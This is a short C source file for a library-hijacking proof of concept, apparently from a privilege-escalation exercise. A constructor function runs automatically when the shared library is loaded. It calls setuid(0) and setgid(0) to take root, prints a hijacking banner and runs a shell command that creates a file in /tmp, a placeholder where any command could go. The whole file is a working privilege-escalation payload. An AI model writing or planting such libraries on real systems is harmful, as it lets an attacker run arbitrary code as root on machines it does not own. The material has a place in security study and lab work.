#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

//a constructor function called runmahpayload, Constructor functions are run when the 
//library is first initialized in order to set up code for the library to use
static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
  //set root, UID, GID
  setuid(0);
  setgid(0);
  printf("DLL HIJACKING IN PROGRESS \n");
  system("touch /tmp/haxso.txt");
}